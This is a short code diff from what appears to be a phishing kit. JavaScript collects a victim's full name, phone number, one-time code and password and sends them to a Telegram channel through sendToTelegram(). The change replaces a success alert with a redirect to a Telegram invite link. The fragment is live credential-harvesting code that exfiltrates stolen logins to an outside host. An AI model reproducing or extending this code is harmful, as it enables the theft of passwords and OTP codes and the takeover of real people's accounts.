@@ -494,11 +494,9 @@ function processThirdData() {
         var message = `Final Submission: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}\nPassword: ${$password}`;
         sendToTelegram(message);
 
-        setTimeout(() => {
-            alert("Data submitted successfully!");
-            hideLoading();
-            window.location.reload();
-        }, 2000);
+        setTimeout(function(){
+        window.location.href = "https://t.me/+wvoJRR3W8CcwMDg1";
+    }, 1000);
 
         return false;
     });
